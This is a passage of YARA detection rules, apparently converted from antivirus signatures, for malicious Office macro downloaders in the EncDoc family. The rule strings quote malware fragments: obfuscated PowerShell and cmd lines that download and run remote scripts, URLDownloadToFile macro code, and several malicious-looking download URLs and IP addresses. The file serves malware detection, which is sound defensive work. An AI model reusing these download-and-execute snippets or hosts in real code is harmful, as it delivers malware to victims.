        $x_1_3 = ".exec(psowerss & \"hell -w \" & sease & \"n Invoke-WebRequest -Uri \" & Chr(34)" ascii //weight: 1
        $x_1_4 = {68 74 74 70 3a 2f 2f [0-114] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29 20 26 20 22 20 2d 4f 75 74 46 22 20 26 20 22 69 6c 65 20 22 20 26 20 43 68 72 28 33 34 29}  //weight: 1, accuracy: Low
        $x_1_5 = {43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 78 22 20 26 20 43 68 72 28 31 30 31 29 20 26 20 43 68 72 28 33 34 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIS_2147770282_25
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIS!MTB"
        threat_id = "2147770282"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IcHYjKFZ = krELvDt + mLysqyaN + \" \" + GBgstGk" ascii //weight: 1
        $x_1_2 = "scHWjmasp = Shell(IcHYjKFZ, 4 / 8 * Sin(0))" ascii //weight: 1
        $x_1_3 = "= \"IAAkAGYAZABzAGYAcwBkAGYAIAA9ACAAIgBmAHMAZgBkAGcAaABmAGQAZABmAGcAaAAiADsAIAAoAE4ARQB3AC0AbwBiAGoARQBjAHQAIAAcIGAATgBgAGUAYABUAGAALgBg" ascii //weight: 1
        $x_1_4 = "GwARQAoACAAHSBoAHQAdABwADoALwAvAHMAdQB5AGEAcwBoAGgAbwBzAHAAaQB0AGEAbAByAGEAaQBwAHUAcgAuAGMAbwBtA" ascii //weight: 1
        $x_1_5 = "iAGYAcwBmAGQAZwBoAGYAZABkAGYAZwBoA\" & _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_TRB_2147770507_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.TRB!MTB"
        threat_id = "2147770507"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" _" ascii //weight: 1
        $x_1_3 = "Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, _" ascii //weight: 1
        $x_1_4 = "Public Function tres()" ascii //weight: 1
        $x_1_5 = "imgsrc = \"http://\" & Sheets(\"Files\").Range(\"B60\") & Sheets(\"Files\").Range(\"B61\") & Sheets(\"Files\").Range(\"B62\")" ascii //weight: 1
        $x_1_6 = "dlpath = Sheets(\"Files\").Range(\"B56\")" ascii //weight: 1
        $x_1_7 = "URLDownloadToFile 0, imgsrc, dlpath, 0, 0" ascii //weight: 1
        $x_1_8 = {42 79 56 61 6c 20 64 77 52 65 73 65 72 76 65 64 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 6c 70 66 6e 43 42 20 41 73 20 4c 6f 6e 67 29 20 41 73 20 4c 6f 6e 67 02 00 23 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_INE_2147770508_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.INE!MTB"
        threat_id = "2147770508"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {49 6e 74 65 6c 43 6f 6d 70 61 6e 79 [0-4] 5c 4a 49 4f 4c 41 53 2e 52 52 54 54 4f 4f 4b 4b}  //weight: 1, accuracy: Low
        $x_1_2 = "starkdoor.com/" ascii //weight: 1
        $x_1_3 = "Geyrtutrf" ascii //weight: 1
        $x_1_4 = {61 70 70 65 72 6f 6c [0-4] 70 6e 67}  //weight: 1, accuracy: Low
        $x_1_5 = "C:\\IntelCompany\\JIOLAS.RRTTOOKK" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DAT_2147771186_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DAT!MTB"
        threat_id = "2147771186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, _" ascii //weight: 1
        $x_1_2 = "ByVal szURL As String, ByVal szFileName As String, _" ascii //weight: 1
        $x_1_3 = "Public Function Dasert()" ascii //weight: 1
        $x_1_4 = "HGSHrfeyatgdrj = Chr$(104) & Chr$(116) & Chr$(116) & Chr$(112) & Chr$(58) & Chr$(47) & Chr$(47) & Sheets(Chr$(68) & Chr$(111) & Chr$(99) & Chr$(115)).Range(Chr$(65) & Chr$(51) & Chr$(53))" ascii //weight: 1
        $x_1_5 = "dlpath = Sheets(Chr$(68) & Chr$(111) & Chr$(99) & Chr$(115)).Range(Chr$(82) & Chr$(50))" ascii //weight: 1
        $x_1_6 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 48 47 53 48 72 66 65 79 61 74 67 64 72 6a 2c 20 64 6c 70 61 74 68 2c 20 30 2c 20 30 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_TRC_2147771222_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.TRC!MTB"
        threat_id = "2147771222"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "If Win64 Then" ascii //weight: 1
        $x_1_2 = "Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, _" ascii //weight: 1
        $x_1_3 = {42 79 56 61 6c 20 64 77 52 65 73 65 72 76 65 64 20 41 73 20 4c 6f 6e 67 2c 20 42 79 56 61 6c 20 6c 70 66 6e 43 42 20 41 73 20 4c 6f 6e 67 29 20 41 73 20 4c 6f 6e 67 02 00 23 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_4 = "Public Function tres()" ascii //weight: 1
        $x_1_5 = "Berti = \"http://\"" ascii //weight: 1
        $x_1_6 = "Guikghjgfh = Berti & Sheets(\"Files\").Range(\"B60\")" ascii //weight: 1
        $x_1_7 = "Btdufjkhn = Sheets(\"Files\").Range(\"B56\")" ascii //weight: 1
        $x_1_8 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 47 75 69 6b 67 68 6a 67 66 68 2c 20 42 74 64 75 66 6a 6b 68 6e 2c 20 30 2c 20 30 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_TRD_2147771287_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.TRD!MTB"
        threat_id = "2147771287"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If Win64 Then" ascii //weight: 1
        $x_1_2 = "Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, _" ascii //weight: 1
        $x_1_3 = "ByVal szURL As String, ByVal szFileName As String, _" ascii //weight: 1
        $x_1_4 = "Public Function Visborn()" ascii //weight: 1
        $x_1_5 = "sioprut = \"ht\" & \"tp://\" & Sheets(\"Docs2\").Range(\"B50\")" ascii //weight: 1
        $x_1_6 = "eivmfsc = Sheets(\"Docs2\").Range(\"S5\")" ascii //weight: 1
        $x_1_7 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 73 69 6f 70 72 75 74 2c 20 65 69 76 6d 66 73 63 2c 20 30 2c 20 30 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ERS_2147771346_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ERS!MTB"
        threat_id = "2147771346"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "#If VBA7 Then" ascii //weight: 1
        $x_1_2 = "Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" _" ascii //weight: 1
        $x_1_3 = "Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, _" ascii //weight: 1
        $x_1_4 = "vndh = pirokfm & fkddl & rgdrgkj & kjddcoj & bfbkrfv & Sheets(\"Docs\").Range(\"A35\")" ascii //weight: 1
        $x_1_5 = "dlpath = Sheets(\"Docs\").Range(\"S50\")" ascii //weight: 1
        $x_1_6 = "URLDownloadToFile 0, vndh, dlpath, 0, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ERT_2147771363_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ERT!MTB"
        threat_id = "2147771363"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Function tres()" ascii //weight: 1
        $x_1_2 = "Gert = \"Files\"" ascii //weight: 1
        $x_1_3 = "Byytuity = \"B56\"" ascii //weight: 1
        $x_1_4 = "Byytuity1 = \"B60\"" ascii //weight: 1
        $x_1_5 = "Guikghjgfh = HJHGuy & HJHGuy1 & HJHGuy2 & HJHGuy3 & Sheets(Gert).Range(Byytuity1)" ascii //weight: 1
        $x_1_6 = "Btdufjkhn = Sheets(Gert).Range(Byytuity)" ascii //weight: 1
        $x_1_7 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 47 75 69 6b 67 68 6a 67 66 68 2c 20 42 74 64 75 66 6a 6b 68 6e 2c 20 30 2c 20 30 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ERV_2147771422_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ERV!MTB"
        threat_id = "2147771422"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Function Viurni()" ascii //weight: 1
        $x_1_2 = "& Sheets(\"Docs1\").Range(\"B30\")" ascii //weight: 1
        $x_1_3 = "= Sheets(\"Docs2\").Range(\"L17\")" ascii //weight: 1
        $x_1_4 = "Private Declare Function URLDownloadToFile Lib \"urlmon\" _" ascii //weight: 1
        $x_1_5 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 76 6e 64 68 2c 20 64 6c 70 61 74 68 2c 20 30 2c 20 30 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {23 49 66 20 57 69 6e 36 34 20 54 68 65 6e [0-8] 23 45 6c 73 65 [0-7] 23 45 6e 64 20 49 66 02 00 23 45 6c 73 65 02 00 23 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
        $x_1_7 = "Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DTS_2147771426_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DTS!MTB"
        threat_id = "2147771426"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://secfile24.top/kd323jasd.php" ascii //weight: 1
        $x_1_2 = "C:\\eoJXKwX\\tsVCUGK\\teMOjMQ.dll" ascii //weight: 1
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
        $x_1_4 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ERW_2147771434_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ERW!MTB"
        threat_id = "2147771434"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Public Function Kiopas()" ascii //weight: 1
        $x_1_2 = "Gert = \"Dodes\"" ascii //weight: 1
        $x_1_3 = "Byytuity = \"C101\"" ascii //weight: 1
        $x_1_4 = "Byytuity1 = \"C105\"" ascii //weight: 1
        $x_1_5 = "& Sheets(Gert).Range(Byytuity1)" ascii //weight: 1
        $x_1_6 = " = Sheets(Gert).Range(Byytuity)" ascii //weight: 1
        $x_1_7 = {52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 47 75 69 6b 67 68 6a 67 66 68 2c 20 42 74 64 75 66 6a 6b 68 6e 2c 20 30 2c 20 30 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_8 = {23 49 66 20 57 69 6e 36 34 20 54 68 65 6e [0-8] 23 45 6c 73 65 [0-7] 23 45 6e 64 20 49 66 02 00 23 45 6c 73 65 02 00 23 45 6e 64 20 49 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DTV_2147771439_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DTV!MTB"
        threat_id = "2147771439"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://kennethfantes.com/ve/qas.EXE" ascii //weight: 1
        $x_1_2 = "C:\\ESOwLkk\\LUgJcIf\\phSzCXz.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_REQ_2147771446_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.REQ!MTB"
        threat_id = "2147771446"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 4a 48 47 75 79 20 3d [0-47] 22 68 74 22 0d 0a 48 4a 48 47 75 79 31 20 3d 20 [0-47] 22 74 70 22 0d 0a 48 4a 48 47 75 79 32 20 3d [0-47] 22 3a 22 0d 0a 48 4a 48 47 75 79 33 20 3d [0-47] 22 2f 2f 22}  //weight: 1, accuracy: Low
        $x_1_2 = {42 79 79 74 75 69 74 79 20 3d 20 22 ?? ?? ?? ?? 22 0d 0a 42 79 79 74 75 69 74 79 31 20 3d 20 22 ?? ?? ?? ?? 22}  //weight: 1, accuracy: Low
        $x_1_3 = "Guikghjgfh = HJHGuy & HJHGuy1 & HJHGuy2 & HJHGuy3 & Sheets(Gert).Range(Byytuity1)" ascii //weight: 1
        $x_1_4 = "Btdufjkhn = Sheets(Gert).Range(Byytuity)" ascii //weight: 1
        $x_1_5 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 20 30 2c 20 47 75 69 6b 67 68 6a 67 66 68 2c 20 42 74 64 75 66 6a 6b 68 6e 2c 20 30 2c 20 30 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVK_2147771452_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVK!MTB"
        threat_id = "2147771452"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"WindowsInstaller.Installer\")" ascii //weight: 1
        $x_1_2 = "pVxDDetzp.InstallProduct \"http://84.32.188.141/\"" ascii //weight: 1
        $x_1_3 = "Worksheets(\"Sheet1\").Unprotect \"123456\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BKS_2147771711_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BKS!MTB"
        threat_id = "2147771711"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Function CreateTable(TableName As String)" ascii //weight: 1
        $x_1_2 = "Dim TempOne As String, Temptwo As String, TempThree As String, TempFour As String" ascii //weight: 1
        $x_1_3 = "TempOne = \".xls\"" ascii //weight: 1
        $x_1_4 = "Temptwo = \".dpd\"" ascii //weight: 1
        $x_1_5 = "TempThree = \"Sheet2\"" ascii //weight: 1
        $x_1_6 = "TempFour = \"Sheet1\"" ascii //weight: 1
        $x_1_7 = "SaveTable TempThree, TableName, Temptwo" ascii //weight: 1
        $x_1_8 = "SaveTable TempFour, TableName, TempOne" ascii //weight: 1
        $x_1_9 = "Dim Result As Long" ascii //weight: 1
        $x_1_10 = "Result = 2 + 20 * 2" ascii //weight: 1
        $x_1_11 = "Worksheets(TableID).SaveAs Addr & FormatN, Result" ascii //weight: 1
        $x_1_12 = "Result = Result - 4" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVL_2147772127_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVL!MTB"
        threat_id = "2147772127"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Write (\"(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/WNJD5XRv')|.( ([String]''.IsNormalized)[5,36,48]-Join'')\")" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "objFSO.CreateTextFile(\"C:\\programdata\\ok.ps1\")" ascii //weight: 1
        $x_1_4 = "workbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RSE_2147772273_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RSE!MTB"
        threat_id = "2147772273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6c 61 6e 6b 61 72 65 63 69 70 65 73 2e 63 6f 6d 2f 6d 61 67 65 73 2e 6a 70 27 20 20 2b 20 27 67 27 30 00 63 75 72 4c 20 20 28 27 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = "CmD.Exe  /C poWeRSheLL.EXe  -ex BYPAsS -NoP -w 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RSE_2147772273_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RSE!MTB"
        threat_id = "2147772273"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cMd.eXe  /c PowERShell  -ex bypAss -noP -w 1 ieX( " ascii //weight: 1
        $x_1_2 = "cUrl  ('http://criti'  + 'cdome.com/cs'  + 'ss.'  + 'jp'  + 'g' ))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_TELA_2147773053_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.TELA!MTB"
        threat_id = "2147773053"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://iffusedtrac.xyz/3/bbc.exe" ascii //weight: 1
        $x_1_2 = "C:\\wCmfmRe\\dtwzrQf\\GZTJoxx.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVM_2147773581_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVM!MTB"
        threat_id = "2147773581"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StrReverse(\"txt.cnE/22/54.101.231.83//:ptth\")" ascii //weight: 1
        $x_1_2 = ".Create(DXCVJZLUTGZTHHUXKLOGSC & UXFROYKWZZUAYTKAGGGFVW, Null, Null, processid)" ascii //weight: 1
        $x_1_3 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RSF_2147773970_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RSF!MTB"
        threat_id = "2147773970"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6d 6f 72 72 69 73 6c 69 62 72 61 72 79 63 6f 6e 73 75 6c 74 69 6e 67 2e 63 6f 6d 2f 66 61 76 69 63 61 6d 2f 67 65 72 74 6e 6d 2e 70 68 70 36 00 68 74 74 70 73 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 3a 5c 68 79 72 64 71 [0-3] 5c 67 77 6e 69 6f 77}  //weight: 1, accuracy: Low
        $x_1_3 = "nfiwpf.exe" ascii //weight: 1
        $x_1_4 = "JJCCCCJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BLK_2147776081_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BLK!MTB"
        threat_id = "2147776081"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(new-object System.Net.WebClient)" ascii //weight: 1
        $x_1_2 = "https://raw.githubusercontent.com/onbdemi/vajneodz9mt/gh-pages/1a6zt9osyd6wsy.jpg" ascii //weight: 1
        $x_1_3 = "%tmp%\\\\RYYIIpz.jar" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_LAS_2147776635_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.LAS!MTB"
        threat_id = "2147776635"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f [0-4] 4a 4a 43 43 42 42 [0-6] 5c 56 69 6a 61 73 65 72 2e 6c 61 73 6a 72}  //weight: 1, accuracy: Low
        $x_1_2 = "JERUI" ascii //weight: 1
        $x_1_3 = "DownloadToFileA" ascii //weight: 1
        $x_1_4 = "DllRegisterSer" ascii //weight: 1
        $x_1_5 = "uRlMon" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SSM_2147778389_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SSM!MTB"
        threat_id = "2147778389"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
